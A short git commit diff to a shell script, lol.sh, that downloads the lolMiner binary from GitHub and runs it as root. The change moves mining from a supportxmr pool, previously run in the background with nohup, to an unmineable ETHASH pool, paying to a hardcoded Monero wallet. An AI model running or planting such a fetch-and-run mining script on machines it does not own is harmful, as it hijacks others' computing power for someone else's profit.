bdb15c96aebe5353cc5db4ccc4031f1c55f88237
mikeyytman <mikeyytman@gmail.com>
2024-10-16 17:16:19 +0530

    Update lol.sh

--- lol.sh
+++ lol.sh
@@ -8,4 +8,4 @@ sudo ph add xmrig
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Lin64.tar.gz
 tar -xvzf lolMiner_v1.91_Lin64.tar.gz
 cd 1.91
-sudo nohup ./lolMiner --algo FISHHASH --pool stratum+ssl://pool.supportxmr.com:443 --user XMR:42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85.gpu 
+sudo ./lolMiner --algo ETHASH --ethstratum ETHPROXY --pool stratum+ssl://ethash.unmineable.com:4444 --user XMR:42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85.2  
